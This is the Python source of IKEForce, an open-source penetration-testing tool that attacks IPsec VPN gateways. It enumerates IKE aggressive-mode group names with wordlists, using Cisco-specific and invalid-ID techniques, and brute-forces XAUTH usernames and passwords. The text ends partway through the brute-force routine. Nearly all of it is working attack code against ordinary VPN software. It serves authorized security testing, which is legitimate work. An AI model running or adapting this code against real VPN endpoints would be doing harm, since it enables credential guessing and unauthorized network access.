#!/usr/bin/env python

#IKEForce
#Created by Daniel Turner dturner@trustwave.com
#Copyright (C) 2014 Trustwave Holdings, Inc.
#This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or (at your option) any later version.
#This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#You should have received a copy of the GNU General Public License along with this program. If not, see <http://www.gnu.org/licenses/>.

import sys,threading,time,SocketServer,struct,array,select,socket
import ikeclient
import dh
import ikehandler
import ikecrypto
import vid
from optparse import OptionParser
from termios import tcflush, TCIOFLUSH
import itertools

usageString = "Usage: %prog [target] [mode] -w /path-to/wordlist.txt [optional] -t 5 1 1 2\nExample: %prog 192.168.1.110 -e -w groupnames.txt"
parser = OptionParser(usage=usageString)
parser.add_option("-w","--wordlist",dest="wordlist",default=None,type="string",help="Path to wordlist file")
parser.add_option("-t","--trans",dest="trans",default=None,help="[OPTIONAL] Transform set: encryption type, hash type, authentication type, dh group (5 1 1 2)",nargs=4,type="int")
parser.add_option("-e","--enum",dest="enum",default=None,action="store_true",help="Set Enumeration Mode")
parser.add_option("-a","--all",dest="all",default=None,action="store_true",help="Set Transform Set Enumeration Mode")
parser.add_option("-b","--brute",dest="brute",default=None,action="store_true",help="Set XAUTH Brute Force Mode")
parser.add_option("-k","--psk",dest="psk",default=None,type="string",help="Pre Shared Key to be used with Brute Force Mode")
parser.add_option("-i","--id",dest="id",default=None,type="string",help="ID or group name. To be used with Brute Force Mode")
parser.add_option("-u","--username",dest="username",default=None,type="string",help="XAUTH username to be used with Brute Force Mode")
parser.add_option("-U","--userlist",dest="userlist",default=None,type="string",help="[OPTIONAL] XAUTH username list to be used with Brute Force Mode")
parser.add_option("-p","--password",dest="password",default=None,type="string",help="XAUTH password to be used with Connect Mode")
parser.add_option("--sport",dest="sport",default=500,type="int",help="Source port to use, default is 500")
parser.add_option("-d","--debug",dest="debug",default=None,action="store_true",help="Set debug on")
parser.add_option("-c","--connect",dest="connect",default=None,action="store_true",help="Set Connect Mode (test a connection)")
parser.add_option("-y","--idtype",dest="idtype",default=None,type="int",help="[OPTIONAL] ID Type for Identification payload. Default is 2 (FQDN)")
parser.add_option("-s","--speed",dest="speed",default=3,type="int",help="[OPTIONAL] Speed of guessing attempts. A numerical value between 1 - 5 where 1 is faster and 5 is slow. Default is 3")
parser.add_option("-l","--keylen",dest="keylen",default=None,type="int",help="[OPTIONAL] Key Length, for use with AES encryption types")
parser.add_option("-v","--vendor",dest="vendor",default=None,type="string",help="[OPTIONAL] Vendor Type (cisco or watchguard currently accepted)")
parser.add_option("--version",dest="version",default=None,type="int",help="[OPTIONAL] IKE verison (default verison 1)")

(opts,args) = parser.parse_args()

usage = "Usage: %s [target] [mode] -w /path-to/wordlist.txt [optional] -t 5 1 1 2"%sys.argv[0]

if len(sys.argv) < 2:
	print usage
	exit(0)

targetIP = sys.argv[1]
wordlist = opts.wordlist
wordcount = 0
passcount = 0
usercount = 0

enum = opts.enum
all = opts.all
brute = opts.brute
psk = opts.psk
IDdata = opts.id
username = opts.username
userlist = opts.userlist
password = opts.password
debug = opts.debug
connect = opts.connect
trans = opts.trans
idType = opts.idtype
vendorType = opts.vendor
version = opts.version

try:
	opts.sport
	sport = opts.sport
except:
	sport = 500

if debug == True:
	print "[+]Debugging Enabled"
	debug = 1
else:
	debug = 0

dicVIDs = vid.dicVIDs

try:
	version
except:
	version = "20" 

#Check required arguments are provided
if enum == True:
	print "[+]Program started in Enumeration Mode"
	if debug > 0:
		print "Ensure the device accepts the selected Transform Set as this may cause inaccurate results"
	if targetIP != None:
		pass
	else:
        	print usage
        	print "Target IP address argument required"
        	exit(0)
        if wordlist != None:
		wordsfile = open(wordlist, "r")
		pass
	else:
                print usage
                print "Group/ID wordlist required for Enumeration Mode"
                exit(0)

elif all == True:
        print "[+]Program started in Transform Set Enumeration Mode"
        if targetIP != None:
                pass
        else:
                print usage
                print "Target IP address argument required"
                exit(0)


elif brute == True:
	print "[+]Program started in XAUTH Brute Force Mode"

	if userlist != None:
	        print "[+]Userlist provided - brute forcing usernames and passwords\nPress return for a status update"
	else:
	        print "[+]Single user provided - brute forcing passwords for user: %s\nPress return for a status update"%username

	if targetIP != None:
		pass
	else:
        	print usage
        	print "-t Target IP address argument required"
        	exit()
	if wordlist != None:
		wordsfile = open(wordlist, "r")
		pass
	else:
		print usage
		print "Password wordlist required for Brute Force Mode"
		exit()
	if userlist != None:
		userlist = open(userlist, "r")
		pass
		
        if IDdata != None:
		pass
	else: 
                print usage
                print "ID/Group name required for Brute Force Mode"
		exit()
        if psk == None:
                print usage
                print "PSK required for Brute Force Mode"
		exit()
        if username != None or userlist != None:
		pass
	else:
                print usage
                print "Username required for Brute Force Mode"
		exit()

elif connect == True:
        print "[+]Program started in Test Mode\n"
        if targetIP != None:
                pass
        else:   
                print usage
                print "-t Target IP address argument required"
                exit()
        if IDdata != None:
                pass
        else:   
                print usage
                print "ID/Group name required for Test Mode"
                exit()
        if psk == None:
                print usage
                print "PSK required for Test Mode"
                exit()
        if username != None:
                pass
        else:   
                print usage
                print "XAUTH username required for Test Mode"
                exit()

else:
	print usage
	print "-e, -a, or -b (mode) argument required"
	exit()

try:
    socket.inet_aton(targetIP)
except socket.error:
        print usage
        print "Target IP address required as first argument"
        exit()

if idType:
	idType = hex(idType)[2:].zfill(2)

else:
	idType = "02"

if trans:
	encType = hex(trans[0])[2:].zfill(2)
	hashType = hex(trans[1])[2:].zfill(2)
	authType = hex(trans[2])[2:].zfill(4)
	DHGroup = hex(trans[3])[2:].zfill(2)
	pass
else:
	#Use static transform values if none are provided
	encType = "05" #3DES
	hashType = "md5"
	authType = "FDE9" #Xauth pre shared key (65001)
	DHGroup = "02" #Diffie Hellman Group 2
	pass


if opts.speed:
	speed = opts.speed
else:
	speed = 3


packets = []
dupPackets = []
dicCrypto = {}




if encType == "3DES-CBC" or encType == "05" or encType == 5:
	keyLen = 24
	IVlen = 16 
if encType == "DES-CBC" or encType == "01" or encType == 1:
	keyLen = 8
	IVlen = 16
if encType == "AES-CBC" or encType == "07" or encType == 7:
	if opts.keylen == None:
        	keyLen = 16 #length 16 but 32 for our purposes as the processing uses hex encoded values

	else:
		keyLen = opts.keylen / 8
	IVlen = 32

enumType = ""

class IKERequestHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        data,sock = self.request
        curThread = threading.currentThread()
        response = "%s: %s"%(curThread.getName(), data)
        hexPacket =  data.encode('hex')
	
	if hexPacket in packets:
		indexPacket = int(packets.index(hexPacket)) + 1
		dupPackets.append(hexPacket)
		if debug > 0:
		        print "\n--------------------Received Packet Number: %s--------------------\n"%(len(packets)+len(dupPackets))
			print "Duplicate of packet %s, discarding"%indexPacket
			print "Duplicate packet count: %s"%len(dupPackets)
	else:
		packets.append(hexPacket)
		if debug > 0:
			print "\n--------------------Received Packet Number: %s--------------------\n"%(len(packets)+len(dupPackets))
			print packets[-1] + "\n"
	return

class ThreadedIKEServer(SocketServer.ThreadingMixIn, SocketServer.UDPServer):
    pass


if __name__ == '__main__':
    port = 500
    address = ('0.0.0.0', sport) 
    server = ThreadedIKEServer(address, IKERequestHandler)
    try:
    	t = threading.Thread(target=server.serve_forever)
    	t.daemon = True
    	if debug > 0:
		print 'IKE Server running in %s'%t.getName()
    	t.start()
    	while True:
	    if all:
		IDdata = "ANYID"
		ikeneg = ikeclient.IKEv1Client(debug)
		ikeCrypto = ikecrypto.ikeCrypto()
		print "[+]Checking for acceptable Transforms\n"
		print "============================================================================================\nAccepted (AM) Transform Sets\n============================================================================================"
		#Temporary dictionary of DH groups currently supported by IKEForce. This will probably be permanent as most hosts that use AM will not be able to or will be not be bothered to use large primes ;)
		DHGroups = dicDHGroup = {'1':'default 768-bit MODP group','2':'alternate 1024-bit MODP group'}
		#Iterate through all combinations of the Transform dictionaries
		for i in itertools.product(ikeneg.dicEType, ikeneg.dicHType, ikeneg.dicAType, DHGroups):
		    #try:
		        encType = i[0].zfill(2)
		        hashType = i[1].zfill(2)
		        authType = hex(int(i[2]))[2:].zfill(4)
		        DHGroup = i[3].zfill(2)

		        if debug > 0:
			    print "Trying Set:%s"%str(i)
		        if len(packets) == 0:
			    if debug > 0:
	                            print "\n--------------------Sending initial packet--------------------"
			    #try:
			    #	    iCookie
			    #except:
			    iCookie = ikeneg.secRandom(8).encode('hex')
			    try:
				    rCookie
			    except:
			            rCookie = "0000000000000000"
			    initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
			    dicCrypto = initDict
			    if debug > 0:
			        print "Waiting for response..."

			    countTime = 0
			    while len(packets) < 1:
			            time.sleep(float(speed)/10)
				    if countTime > 25:
					    break
				    countTime += 1

			if len(packets) == 1:
                            #Process Header first
                            ikeHandling = ikehandler.IKEv1Handler(debug)
                            ikeHDR = ikeHandling.parseHeader(packets[-1])

                            #Check the packet is for this session
                            if ikeHDR[1] == dicCrypto["iCookie"]:
                                    pass
                            else:   
                                    if debug > 0:
                                            print "Packet received does not match this session, this is probably from a previous incarnation."
                                            print "Removing packet"
                                    del packets[0]
                                    continue

                            respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)

                            #Check if packet is informational
                            if respDict["xType"] == 5:
                                    if int(respDict["notmsgType"]) == 14:
				            if debug > 0:
					            print "[-] Notify Message Received: %s"%ikeHandling.dicNotType[str(respDict["notmsgType"])]
	                                            print "[-] Invalid Transform Set selected\n"
				            del packets[:]
                                    else:
					    if debug > 0:
	                                            try:   
	                                                    print "[-] Notify Message Received: %s"%ikeHandling.dicNotType[str(respDict["notmsgType"])]
	                                            except:
	                                                    print "[-] Unknown Notify Type received: %s"%respDict["notmsgType"]
					    del packets[:]

			    elif respDict["xType"] == 4:
				    print "| %s : %s | %s : %s | %s : %s | %s : %s |\n--------------------------------------------------------------------------------------------"%(i[0], ikeneg.dicEType[i[0]], i[1], ikeneg.dicHType[i[1]], i[2], ikeneg.dicAType[i[2]], i[3], dicDHGroup[i[3]])
			            del packets[:]
			            continue


		print "============================================================================================"
		exit()


	    elif enum:
		    wordline = 0
		    IDdata = "thiSIDDoesnotexit33349204"
		    psk = "anypskthatdoesnotexistfhfhssi575"
		    ikeneg = ikeclient.IKEv1Client(debug)
		    ikeCrypto = ikecrypto.ikeCrypto()
		    print "[+]Checking for possible enumeration techniques"
		    if len(packets) == 0:
			if debug > 0:
	                        print "\n--------------------Sending initial packet - this will help decide which enumeration technnique to use--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"
			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
			dicCrypto = initDict
			print "Analyzing initial response. Please wait, this can take up to 15 seconds..."
			#Count lines in wordlist for later use
                        for w in wordsfile:
                        	wordcount += 1
                        wordsfile.seek(0)
			countTime = 0
			while len(packets) < 1:
				time.sleep(1)
				if countTime > 10:
					break
				countTime += 1
			

			#First device check, checking for response packet
			if len(packets) == 0:
			    if debug > 0:
				    print "--------------------No response received-------------------"
                            enumType = "Generic"
                            print "[+]Using Generic enumeration technique. Where no initial response is received for an incorrect ID and the handshake is continued if correct"
			    raw_input("[+]WARNING - This method is the least reliable, the device may genuinely not accept aggressive mode connections.\nHowever, some devices do allow enumeration in this way - Watchguard devices for example. Note that these devices use ID type 3 not the default of 2. Set with -y 3.\n[+]Press return to accept and continue.\n")
			    print "[+]Generic enumeration technique running..."
			    print "Press return for a status update"
			    #First count words in file for status update
			    for w in wordsfile:
			    	wordcount += 1
			    wordsfile.seek(0)

			    #Use generic enumeration technique
			    for w in wordsfile:
				wordline += 1
			    	IDdata = w.strip()
			    	#Print update if return is pressed
			    	readInput = [sys.stdin]
			    	inp = select.select(readInput, [], [], 0.1)[0]
			    	if inp:
					percent = wordline / float(wordcount) * 100
			    		print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
			    		tcflush(sys.stdin, TCIOFLUSH)
			    	else:
					pass

				if debug > 0:
					print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
				initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
				time.sleep(speed)
				if len(packets) > 0:
					ikeHandling = ikehandler.IKEv1Handler(debug)
					respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
					print "[*]Correct ID Found: %s\n"%IDdata
					time.sleep(2)
					exit()
				else:
					if debug > 0:
                                        	print "[-] ID Incorrect"
                                        	print "Restarting...\n"
                                        del packets[:]
					continue
			    print "[-]ID not found, try another wordlist. Exiting...\n"
			    time.sleep(2)
			    exit()

		    if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."
			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
			#Check if packet is informational
			if respDict["xType"] == 5:
				if int(respDict["notmsgType"]) == 18:
					enumType = "Info"
					print "[+]Device allows enumeration via 'INVALID-ID-INFORMATION' response"
				elif int(respDict["notmsgType"]) == 14:
					print "[-] Invalid Transform Set selected. Run the tool again with the -a flag to enumerate all accepted AM transform sets"
					exit()
				else:
					try:
						print "[-] Notify Message Received: %s"%ikeHandling.dicNotType[str(respDict["notmsgType"])]
					except:
						print "[-] Unknown Notify Type received: %s"%respDict["notmsgType"]
					exit()
					
	
			#Begin enumeration (Info)
			if enumType == "Info":
				print "Restarting...\n"
				print "[+]Using Invalid ID Notification Enumeration Technique"
				print "Press return for a status update"
				del packets[:]
                        	#First count words in file for status update
                        	for w in wordsfile:
                                	wordcount += 1
                                wordsfile.seek(0)

				while len(packets) <= 2:
					for w in wordsfile:
					    wordline += 1
					    IDdata = w.strip()	
                                            readInput = [sys.stdin]
                                            inp = select.select(readInput, [], [], 0.1)[0]
                                            if inp:
						percent = wordline / float(wordcount) * 100
                                            	print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
                                            	tcflush(sys.stdin, TCIOFLUSH)

                                            else:
                                            	pass
                    			    if len(packets) == 0: #do we actually need this prob not?
                        			iCookie = ikeneg.secRandom(8).encode('hex')
                        			rCookie = "0000000000000000"
						if debug > 0:
							print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
                        			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
                        			dicCrypto = dict(initDict.items())
						time.sleep(speed)

						if len(packets) == 1:
        					        #Parse full packet
                        				respDict,listVIDs = ikeHandling.main(packets[-1],encType,hashType)
                        				#Update state/crypto dictionary
                        				dicCrypto.update(respDict)
							if dicCrypto["xType"] == 4:
								print "[*]Correct ID Found: %s\n"%IDdata
								time.sleep(2)
								exit()
							elif dicCrypto["xType"] == 5 and dicCrypto["notmsgType"] == 18:
								del packets[:]
								continue
							elif dicCrypto["xType"] == 5:
								print "[*]Potential Correct ID Found: %s\n"%IDdata
								print "However, a notification payload was received. This may be due to an invalid Transform Set or other error. To be sure try a connection with a valid Transform Set."
								time.sleep(2)
								exit()
						

					print "[-]ID not found, try another wordlist. Exiting...\n"
					time.sleep(2)
					exit()
			else:
				pass

			#Enumerate the device type and decide what technique to use for ID/group enumeration
                        for i in listVIDs:
                                try:
					if debug > 0:
	                                        print "VID received: %s (%s)"%(dicVIDs[i], i)
					if "Cisco" in dicVIDs[i]:
						enumType = "Cisco"

                                except:
					if debug > 0:
	                                        print "Unknown VID received: %s"%i
					pass
			if enumType == "Cisco":
				print "\n[+]Cisco Device detected"
				for i in listVIDs:
                                	try:
                                        	if "Dead Peer" in dicVIDs[i]: 
							print "[-]Not vulnerable to DPD group name enumeration" 
							time.sleep(10)
							if len(packets) + len(dupPackets) > 1:
								print "[-]Not vulnerable to multiple response group name enumeration. Device is fully patched. Exiting...\n"
								exit()
							else:
								print "[+]Device is vulnerable to multiple response group name enumeration"
								enumType = "Cisco2"
								break
						else:
							enumType = "Cisco1"
							pass

                                	except TypeError:
						print "FAILED"
                                        	pass

			else:
				print "[-]No matching enumeration technique available for this device."
				time.sleep(2)
				exit()

			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)

			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
			DHPubKey_r = dicCrypto["DHPubKey_r"]
			SA_i = dicCrypto["SA_i"]

			#Check exchange type is in the right format
			try:
				xType = hex(xType)[2:].zfill(2)
			except:
				pass
		
                        #Begin enumeration (Cisco1)
                        if enumType == "Cisco1":
                                print "Restarting...\n"
                                print "[+]Using DPD Cisco Group Enumeration Technique"
				print "Press return for a status update"
                                del packets[:]
                                #First count words in file for status update
                                for w in wordsfile:
                                	wordcount += 1
                                wordsfile.seek(0)

                                while len(packets) <= 1:
					for w in wordsfile:
					    wordline += 1
                                            IDdata = w.strip()
                                            readInput = [sys.stdin]
                                            inp = select.select(readInput, [], [], 0.1)[0]
                                            if inp:
						    percent = wordline / float(wordcount) * 100
                                                    print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
                                                    tcflush(sys.stdin, TCIOFLUSH)
                                            else:
                                                    pass
                                            if len(packets) == 0: #do we actually need this prob not?
                                                iCookie = ikeneg.secRandom(8).encode('hex')
                                                rCookie = "0000000000000000"
						if debug > 0:
	                                                print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
                                                initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
                                                dicCrypto = dict(initDict.items())
                                                time.sleep(speed)
                                                try:
							respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
							for i in listVIDs:
       	  			                        	if "afcad71368a1f1c96b8696fc7" in str(i): #DPD VID
	       	                		        		print "[*]Correct ID Found: %s\n"%IDdata
									time.sleep(2)
									exit()
                                                		else:
									pass

							del packets[:]
							del listVIDs[:]
							continue

						except IndexError:
							if debug > 0:
								print "[*] Potential Correct ID Found: %s. However this Group/ID probably does not have a PSK associated with it and the handshake will not complete. Continuing...\n"%IDdata
							pass
					print "[-]ID not found, try another wordlist. Exiting...\n"
					time.sleep(2)
					exit()

			#Begin enumeration (Cisco2)
			if enumType == "Cisco2":
				print "Restarting...\n"
				print "[+]Using New Cisco Group Enumeration Technique"
				print "Press return for a status update"
				del packets[:]
                                #First count words in file for status update
                                for w in wordsfile:
                                	wordcount += 1
                                wordsfile.seek(0)

				while len(packets) <= 2:
					for w in wordsfile:
					    wordline += 1
					    IDdata = w.strip()
                                            readInput = [sys.stdin]
                                            inp = select.select(readInput, [], [], 0.1)[0]
                                            if inp:
						    percent = wordline / float(wordcount) * 100
                                                    print "Current Guess: %s (%s%%)\n"%(IDdata,int(percent))
                                                    tcflush(sys.stdin, TCIOFLUSH)

                                            else:
                                                    pass
                    			    if len(packets) == 0: #do we actually need this prob not?
                        			iCookie = ikeneg.secRandom(8).encode('hex')
                        			rCookie = "0000000000000000"
						if debug > 0:
							print "\n--------------------Sending first Aggressive Mode packet with ID: %s--------------------"%IDdata
                        			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
                        			dicCrypto = dict(initDict.items())
						time.sleep(speed)
						if len(packets) < 1:
							time.sleep(4)
							if len(packets) < 1:
								if debug > 0:
		                                                        print "[*] Potential Correct ID Found: %s. However this Group/ID does not have a PSK associated with it. Continuing...\n"%IDdata
								continue
						else:
                                                        pass
							
					    if len(packets) == 1:
			                        #Process Header first
        			                ikeHandling = ikehandler.IKEv1Handler(debug)
                        			ikeHDR = ikeHandling.parseHeader(packets[-1])
                       				#Check the packet is for this session
                        			if ikeHDR[1] == dicCrypto["iCookie"]:
                                			pass
                        			else:   
                                			if debug > 0:
                                        			print "Packet received does not match this session, this is probably from a previous incarnation"
                                        			print "Removing packet"
                                			del packets[-1]
                                			continue
						try:
							respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
						except IndexError:
							if debug > 0:
								print "[*]Potential Correct ID Found: %s. However this Group/ID probably does not have a PSK associated with it and the handshake will not complete. Continuing...\n"%IDdata
							continue
                        			dicCrypto.update(respDict)

                        			#Pull the useful values from stored dictionary for crypto functions
                        			nonce_i = dicCrypto["nonce_i"]
                        			DHPubKey_i = dicCrypto["DHPubKey_i"]
                        			nonce_r = dicCrypto["nonce_r"]
                        			ID_i = dicCrypto["ID_i"]
                        			ID_r = dicCrypto["ID_r"]
                        			rCookie = dicCrypto["rCookie"]
                        			xType = dicCrypto["xType"]
                        			msgID = dicCrypto["msgID"]
                        			privKey = dicCrypto["privKey"]
                        			DHPubKey_r = dicCrypto["DHPubKey_r"]
                        			SA_i = dicCrypto["SA_i"]
                        			#Check exchange type is in the right format
                        			try:
                        			        xType = hex(xType)[2:].zfill(2)
                        			except:
                        		        	pass
						#Construct final aggressive mode exchange packet
						if debug > 0:
							print "Processing response..."				
						#Run Crypto Functions - DH first
						ikeDH = dh.DiffieHellman(DHGroup)
						secret = ikeDH.genSecret(privKey,int(DHPubKey_r,16))
						hexSecret = '{0:x}'.format(secret)#using new formating to deal with long int
                        			if len(hexSecret) % 2 != 0:
                                			#Odd length string fix/hack
                                			hexSecret = "0" + hexSecret
						if debug > 0:
							print "SA_i: %s"%SA_i
							print "Secret: %s"%secret
							print "Hexlified Secret: %s"%hexSecret

						skeyid = ikeCrypto.calcSKEYID(psk, nonce_i.decode('hex'), nonce_r.decode('hex'), hashType)
						hash_i = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'), ID_r.decode('hex'), ID_i.decode('hex'),"i",hashType)
						hash_r = ikeCrypto.calcHASH(skeyid, DHPubKey_r.decode('hex'), DHPubKey_i.decode('hex'), rCookie.decode('hex'), iCookie.decode('hex'), SA_i.decode('hex'),ID_r.decode('hex'), ID_i.decode('hex'),"r",hashType)
						skeyid_d = ikeCrypto.calcSKEYID_d(skeyid, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
						skeyid_a = ikeCrypto.calcSKEYID_a(skeyid, skeyid_d, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
						skeyid_e = ikeCrypto.calcSKEYID_e(skeyid, skeyid_a, hexSecret.decode('hex'), iCookie.decode('hex'), rCookie.decode('hex'), hashType)
	                        		if len(skeyid_e) < keyLen:
                                			encKey = ikeCrypto.calcKa(skeyid_e, keyLen, hashType)
		                                	if debug > 0:
        		                                	print "Encryption Key: %s"%encKey.encode('hex')
                        			else:   
                                			encKey = skeyid_e[:keyLen]
							if debug > 0:
								print "Encryption Key: %s"%encKey.encode('hex')
						initIV = ikeCrypto.calcIV(DHPubKey_i.decode('hex'),DHPubKey_r.decode('hex'), IVlen, hashType)
					

						dicCrypto["skeyid"] = skeyid
						dicCrypto["skeyid_a"] = skeyid_a
						dicCrypto["skeyid_d"] = skeyid_d
						dicCrypto["skeyid_e"] = skeyid_e
						dicCrypto["encKey"] = encKey
						dicCrypto["initIV"] = initIV

						#Hash payload
						arrayHash = ikeneg.ikeHash("0d",hash_i)#next payload 11 = notification
                        			lenHash = len(arrayHash)
                        			bytesHash = struct.pack(("B"*lenHash),*arrayHash)

                        			#VID payload
                        			arrayVID = ikeneg.ikeVID("00","09002689dfd6b712")
                        			lenVID = len(arrayVID)
                        			bytesVID = struct.pack(("B"*lenVID),*arrayVID)
						
                        			#Encrypt everything but the header
						plainData = (bytesHash+bytesVID)
						plainPayload = ikeCrypto.calcPadding(encType, plainData)
						if debug > 0: 
                                			print "Plain-text Payload: %s"%plainPayload.encode('hex')
				
                        			cipher = ikeCrypto.ikeCipher(encKey, initIV, encType)
                        			encPayload = cipher.encrypt(plainPayload)
			
						if debug > 0:
							print "Encrypted Payload: %s"%encPayload.encode('hex')

        					arrayencPayload = array.array('B', encPayload)
						lenencPayload = len(arrayencPayload)
						bytesencPayload = struct.pack(("B"*lenencPayload),*arrayencPayload)
						arrayHDR = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload is always hash (08)
						lenHDR = len(arrayHDR)
						bytesHDR = struct.pack(("B"*lenHDR),*arrayHDR)
      	  					bytesIKE = bytesHDR+bytesencPayload
						if debug > 0:
							print "\n--------------------Sending second (encrypted) Aggressive Mode packet--------------------"
						ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
						dicCrypto["p2IV"] = bytesIKE.encode('hex')[-IVlen:]
                        			dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]#phase 2 IV and last block are the same at this point
						time.sleep(speed)
					    if len(packets) > 1:
							#Parse the header first
							ikeHandling = ikehandler.IKEv1Handler(debug)
                        				ikeHDR = ikeHandling.parseHeader(packets[1])
				                        #Check the packet is for this session
                        				if ikeHDR[1] == dicCrypto["iCookie"]:
                                				pass
                        				else:   
								if debug > 0:
	                                				print "Packet received does not match this session, this is probably from a previous incarnation."
									print "Removing packet"
                                				del packets[-1]
                                				continue

		                            		try:   
                    			        	    	if ikeHDR[5] == dicCrypto["msgID"]:
                                        				if debug > 0:
                                                				print "Message ID has not changed"

		                                        		curIV = dicCrypto["lastBlock"].decode('hex')
                		                        		pass    
                        		            		else:
                                        				if debug > 0:
                                                				print "Message ID has changed, recalculating IV"
                                        				msgID = ikeHDR[5]
                                        				curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        				pass
		                            		except:
                    			    			print "Invalid Message ID, too many concurrent sessions running. Wait 30 seconds and try again.\nExiting"
                                				exit()

        					        #Parse full packet
                        				respDict,listVIDs = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        				#Update state/crypto dictionary
                        				dicCrypto.update(respDict)
							if dicCrypto["xType"] == "05" or 5:
								print "[*]Correct ID Found: %s\n"%IDdata
								time.sleep(2)
								exit()
							else:
								if debug > 0:
	                                                                print "Packet received does not match this session, this is probably from a previous incarnation."
									print "Removing packet"
                                                                del packets[-1]
                                                                continue

					    else:
						if debug > 0:
							print "No further responses received\n"
							print "[-] ID Incorrect"
							print "Restarting...\n"
						del packets[:]

					print "[-]ID not found, try another wordlist. Exiting...\n"
					time.sleep(2)
					exit()
			else:
				print "No enumeration technique matched. Exiting...\n"
				time.sleep(2)
				exit()		


	    elif brute:
	     #Run XAUTH brute force
	     #First count the lines in the file due to the way python handles EOF and the way we need to reset the connection after 3 attempts for cisco
             for w in wordsfile:
               wordcount += 1
             wordsfile.seek(0)
	     ikeneg = ikeclient.IKEv1Client(debug)
	     ikeCrypto = ikecrypto.ikeCrypto()
	     if userlist != None:
	      for u in userlist:
		usercount += 1
	      userlist.seek(0)
	      for u in userlist:
	       passcount = 0
	       wordsfile.seek(0)
	       username = u.strip()
	       while passcount < wordcount:
		if len(packets) == 0:
			if debug > 0:
				print "\n--------------------Sending first Aggressive Mode packet--------------------"
			try:
				iCookie
			except:
				iCookie = ikeneg.secRandom(8).encode('hex')
			try:
				rCookie
			except:
				rCookie = "0000000000000000"
			initDict = ikeneg.main(iCookie,rCookie,encType,hashType,authType,DHGroup,IDdata,"00",targetIP,idType,sport,keyLen)
			time.sleep(speed)
			if len(packets) == 0:
				print "No response received, exiting...\n"
				time.sleep(2)
				exit()
			dicCrypto = dict(initDict.items())
			while len(packets) < 1:
				time.sleep(0.5)

		if len(packets) == 1:
			if debug > 0:
				print "Response received, processing packet..."

                        #Parse the header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                if debug > 0:
                                        print "Packet received does not match this session, this is probably from a previous incarnation"
                                        print "Removing packet"
                                del packets[-1]
                                continue

                        #Check for informational packet
                        if ikeHDR[4] == 5:
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
				print "Informational packet received. Enable full debugging for more info. Exiting..."
				time.sleep(2)
                                exit()
                        else:
                                pass

			flags = "01"
			ikeHandling = ikehandler.IKEv1Handler(debug)
			respDict,listVIDs  = ikeHandling.main(packets[-1],encType,hashType)
			dicVIDs = vid.dicVIDs
			for i in listVIDs:
				try:
					if debug > 0:
						print "VID received: %s (%s)"%(dicVIDs[i], i)
					if "Cisco" in dicVIDs[i]:
						vendorType = "cisco"
				except:
					if debug > 0:
						print "Unknown VID received: %s"%i
	



			#Combine the dictionaries from sent packet and received packet
			dicCrypto.update(respDict)
			#Pull the useful values from stored dictionary for crypto functions
                        nonce_i = dicCrypto["nonce_i"]
                        DHPubKey_i = dicCrypto["DHPubKey_i"]
			nonce_r = dicCrypto["nonce_r"]
			ID_i = dicCrypto["ID_i"]
			ID_r = dicCrypto["ID_r"]
			rCookie = dicCrypto["rCookie"]
			xType = dicCrypto["xType"]
			msgID = dicCrypto["msgID"]
			privKey = dicCrypto["privKey"]
